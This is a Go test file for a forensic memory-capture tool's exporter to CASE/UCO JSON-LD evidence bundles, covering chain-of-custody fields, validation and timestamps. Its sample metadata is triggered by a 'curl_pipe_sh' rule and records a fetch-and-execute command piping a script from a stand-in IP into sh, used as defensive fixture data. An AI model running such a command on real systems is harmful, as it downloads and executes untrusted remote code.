package format

import (
	"encoding/json"
	"strings"
	"testing"
	"time"
)

func sampleMetadata() CaptureMetadata {
	now := time.Date(2026, 3, 14, 9, 15, 0, 0, time.UTC)
	return CaptureMetadata{
		CaseID:          "6f1c2b3a-4d5e-4f60-9a8b-7c6d5e4f3a2b",
		TriggerRule:     "curl_pipe_sh",
		TriggerSeverity: "critical",
		TriggerMITRE:    "T1059.004",
		TriggerCmdline:  "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh",
		TriggerTime:     now,

		HostPID:      48291,
		NamespacePID: 1,
		UID:          0,
		Comm:         "sh",
		BinaryPath:   "/usr/bin/sh",
		Arguments:    []string{"/bin/sh", "-c", "curl -s http://198.51.100.9/p.sh | sh"},

		ContainerID:   "3f2b1c0d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c",
		PodName:       "victim-app-7d9f8b6c5-x2kqp",
		PodNamespace:  "victim",
		PodUID:        "b6c5d4e3-f2a1-4b0c-9d8e-7f6a5b4c3d2e",
		ContainerRT:   "containerd",
		CgroupID:      91237845,
		CgroupPath:    "/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podb6c5d4e3_f2a1_4b0c_9d8e_7f6a5b4c3d2e.slice/cri-containerd-3f2b1c0d.scope",
		NodeName:      "worker-3",
		KernelVersion: "6.8.0-31-generic",

		CaptureStart:   now.Add(180 * time.Millisecond),
		CaptureEnd:     now.Add(520 * time.Millisecond),
		DumpFileName:   "dump.bin.zst.enc",
		DumpFilePath:   "/var/lib/flight-recorder/evidence/6f1c2b3a/dump.bin.zst.enc",
		DumpSizeBytes:  4194304,
		DumpSHA256:     "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
		RegionCount:    12,
		FullRegions:    10,
		PartialRegions: 1,
		FailedRegions:  1,
		SkippedRegions: 24,
		CaptureStatus:  "partial",
		Encrypted:      true,
		Compression:    "zstd-3",

		MerkleRoot:     "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
		MerkleLeaves:   1024,
		MerkleDepth:    11,
		MerkleChunk:    4096,
		OddLeafPolicy:  "duplicate_last",
		Signature:      "3045022100abcdef",
		SignerKeyID:    "fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9",
		SignatureAlg:   "ecdsa-p256-sha256-asn1",
		SealTime:       now.Add(700 * time.Millisecond),
		SealDurationMS: 42.5,

		ToolName:       "flight-recorder",
		ToolVersion:    "0.1.0",
		ToolCommit:     "abc1234",
		ToolSelfSHA256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		Operator:       "system:serviceaccount:flight-recorder:flight-recorder",

		Classification: ClassificationConfidential,
	}
}

func TestExportProducesValidJSONLD(t *testing.T) {
	raw, err := ExportToCASE(sampleMetadata())
	if err != nil {
		t.Fatalf("ExportToCASE: %v", err)
	}

	// Must be parseable by any JSON-LD consumer, which starts with being
	// valid JSON.
	var generic map[string]any
	if err := json.Unmarshal(raw, &generic); err != nil {
		t.Fatalf("output is not valid JSON: %v", err)
	}

	ctx, ok := generic["@context"].(map[string]any)
	if !ok {
		t.Fatal("@context is missing or not an object")
	}
	for _, prefix := range []string{"case-core", "case-investigation", "uco-core", "uco-observable", "uco-action", "uco-tool", "uco-types", "fr", "kb", "xsd"} {
		if _, ok := ctx[prefix]; !ok {
			t.Errorf("@context is missing prefix %q", prefix)
		}
	}

	graph, ok := generic["@graph"].([]any)
	if !ok || len(graph) == 0 {
		t.Fatal("@graph is missing or empty")
	}
}

func TestExportContainsRequiredObjects(t *testing.T) {
	bundle, err := BuildBundle(sampleMetadata())
	if err != nil {
		t.Fatalf("BuildBundle: %v", err)
	}

	types := map[string]int{}
	for _, node := range bundle.Graph {
		if t, ok := node["@type"].(string); ok {
			types[t]++
		}
	}

	for _, required := range []string{
		"uco-observable:ObservableObject",
		"uco-observable:Process",
		"case-investigation:InvestigativeAction",
		"case-investigation:ProvenanceRecord",
		"uco-tool:Tool",
		"uco-identity:Identity",
		"uco-core:Relationship",
	} {
		if types[required] == 0 {
			t.Errorf("bundle contains no %s", required)
		}
	}

	// The four relationships the plan requires, plus the container link.
	if types["uco-core:Relationship"] < 5 {
		t.Errorf("found %d relationships, want at least 5", types["uco-core:Relationship"])
	}
}

func TestExportCarriesChainOfCustodyMetadata(t *testing.T) {
	meta := sampleMetadata()
	raw, err := ExportToCASE(meta)
	if err != nil {
		t.Fatalf("ExportToCASE: %v", err)
	}
	doc := string(raw)

	// ISO 27037 and Daubert both turn on being able to identify the tool, the
	// environment and the operator. Each of these must survive into the output.
	required := map[string]string{
		"tool version":     meta.ToolVersion,
		"tool commit":      meta.ToolCommit,
		"binary self-hash": meta.ToolSelfSHA256,
		"kernel version":   meta.KernelVersion,
		"node name":        meta.NodeName,
		"operator":         meta.Operator,
		"merkle root":      meta.MerkleRoot,
		"signature":        meta.Signature,
		"signer key id":    meta.SignerKeyID,
		"dump digest":      strings.ToUpper(meta.DumpSHA256),
		"container id":     meta.ContainerID,
		"pod name":         meta.PodName,
		"cgroup path":      meta.CgroupPath,
		"clock source":     "CLOCK_BOOTTIME",
		"acquisition":      "process_vm_readv",
		"classification":   string(ClassificationConfidential),
	}

	for label, value := range required {
		if !strings.Contains(doc, value) {
			t.Errorf("%s (%q) is missing from the CASE bundle", label, value)
		}
	}
}

func TestExportRecordsAcquisitionCompleteness(t *testing.T) {
	bundle, err := BuildBundle(sampleMetadata())
	if err != nil {
		t.Fatalf("BuildBundle: %v", err)
	}

	raw, err := json.Marshal(bundle)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	parsed, err := ParseBundle(raw)
	if err != nil {
		t.Fatalf("ParseBundle: %v", err)
	}

	status, ok := parsed.FindFacetValue("fr:MemoryAcquisitionFacet", "fr:captureStatus")
	if !ok {
		t.Fatal("acquisition facet does not record the capture status")
	}
	if status != "partial" {
		t.Errorf("capture status = %v, want partial", status)
	}

	if _, ok := parsed.FindFacetValue("fr:MemoryAcquisitionFacet", "fr:partialRegions"); !ok {
		t.Error("partial region count is missing; an examiner cannot tell how complete the dump is")
	}
	if _, ok := parsed.FindFacetValue("fr:SealFacet", "fr:merkleRoot"); !ok {
		t.Error("seal facet does not carry the Merkle root")
	}
}

func TestExportRejectsIncompleteMetadata(t *testing.T) {
	cases := map[string]func(*CaptureMetadata){
		"no case id":     func(m *CaptureMetadata) { m.CaseID = "" },
		"no merkle root": func(m *CaptureMetadata) { m.MerkleRoot = "" },
		"no dump digest": func(m *CaptureMetadata) { m.DumpSHA256 = "" },
	}

	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			meta := sampleMetadata()
			mutate(&meta)
			if _, err := ExportToCASE(meta); err == nil {
				t.Error("expected an error: unsealed or unidentified evidence must not be exportable")
			}
		})
	}
}

func TestValidateRejectsMalformedBundles(t *testing.T) {
	base := func(t *testing.T) *Bundle {
		t.Helper()
		b, err := BuildBundle(sampleMetadata())
		if err != nil {
			t.Fatalf("BuildBundle: %v", err)
		}
		return b
	}

	t.Run("dangling reference", func(t *testing.T) {
		b := base(t)
		for _, node := range b.Graph {
			if node["@type"] == "uco-core:Relationship" {
				node["uco-core:target"] = ref("kb:does-not-exist")
				break
			}
		}
		if err := Validate(b); err == nil {
			t.Error("a relationship pointing at a nonexistent object was accepted")
		}
	})

	t.Run("duplicate id", func(t *testing.T) {
		b := base(t)
		clone := map[string]any{"@id": b.Graph[0]["@id"], "@type": "uco-core:Relationship"}
		b.Graph = append(b.Graph, clone)
		if err := Validate(b); err == nil {
			t.Error("duplicate @id was accepted")
		}
	})

	t.Run("unbound prefix", func(t *testing.T) {
		b := base(t)
		b.Graph[0]["nope:field"] = "value"
		if err := Validate(b); err == nil {
			t.Error("a term using an unbound prefix was accepted")
		}
	})

	t.Run("missing context prefix", func(t *testing.T) {
		b := base(t)
		delete(b.Context, "uco-observable")
		if err := Validate(b); err == nil {
			t.Error("a bundle with an incomplete @context was accepted")
		}
	})

	t.Run("missing required class", func(t *testing.T) {
		b := base(t)
		filtered := b.Graph[:0]
		for _, node := range b.Graph {
			if node["@type"] == "case-investigation:ProvenanceRecord" {
				continue
			}
			filtered = append(filtered, node)
		}
		b.Graph = filtered
		if err := Validate(b); err == nil {
			t.Error("a bundle with no ProvenanceRecord was accepted; evidence without provenance is not evidence")
		}
	})

	t.Run("malformed hash", func(t *testing.T) {
		b := base(t)
		for _, node := range b.Graph {
			facets, ok := node["uco-core:hasFacet"].([]map[string]any)
			if !ok {
				continue
			}
			for _, f := range facets {
				if f["@type"] == "fr:SealFacet" {
					f["fr:merkleRoot"] = "not-a-hash"
				}
			}
		}
		if err := Validate(b); err == nil {
			t.Error("a malformed Merkle root was accepted")
		}
	})

	t.Run("empty graph", func(t *testing.T) {
		b := base(t)
		b.Graph = nil
		if err := Validate(b); err == nil {
			t.Error("an empty graph was accepted")
		}
	})

	t.Run("nil bundle", func(t *testing.T) {
		if err := Validate(nil); err == nil {
			t.Error("a nil bundle was accepted")
		}
	})
}

func TestExportWithoutContainerMetadata(t *testing.T) {
	meta := sampleMetadata()
	meta.ContainerID = ""
	meta.PodName = ""
	meta.PodNamespace = ""
	meta.CgroupPath = ""

	raw, err := ExportToCASE(meta)
	if err != nil {
		t.Fatalf("a host process capture must still export: %v", err)
	}
	if !strings.Contains(string(raw), "host process 48291") {
		t.Error("host-process description is missing")
	}
}

func TestTimestampsAreUTCRFC3339(t *testing.T) {
	meta := sampleMetadata()
	// Deliberately supply a non-UTC time: the exporter must normalise it.
	loc := time.FixedZone("UTC+8", 8*3600)
	meta.CaptureStart = meta.CaptureStart.In(loc)

	raw, err := ExportToCASE(meta)
	if err != nil {
		t.Fatalf("ExportToCASE: %v", err)
	}

	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	found := 0
	var walk func(any)
	walk = func(v any) {
		switch node := v.(type) {
		case map[string]any:
			if node["@type"] == "xsd:dateTime" {
				value, _ := node["@value"].(string)
				if !strings.HasSuffix(value, "Z") {
					t.Errorf("timestamp %q is not in UTC", value)
				}
				if _, err := time.Parse(time.RFC3339Nano, value); err != nil {
					t.Errorf("timestamp %q is not RFC 3339: %v", value, err)
				}
				found++
			}
			for _, child := range node {
				walk(child)
			}
		case []any:
			for _, child := range node {
				walk(child)
			}
		}
	}
	walk(doc)

	if found == 0 {
		t.Fatal("no typed timestamps found in the bundle")
	}
}

func TestNewCaseIDIsUnique(t *testing.T) {
	seen := make(map[string]struct{}, 1000)
	for i := 0; i < 1000; i++ {
		id := NewCaseID()
		if _, dup := seen[id]; dup {
			t.Fatalf("duplicate case id %s", id)
		}
		seen[id] = struct{}{}
	}
}

func TestBundleDigestIsStable(t *testing.T) {
	raw, err := ExportToCASE(sampleMetadata())
	if err != nil {
		t.Fatalf("ExportToCASE: %v", err)
	}
	first, second := BundleDigest(raw), BundleDigest(raw)
	if first != second {
		t.Error("digest is not stable")
	}
	if len(first) != 64 {
		t.Error("digest is not a SHA-256 hex string")
	}
}
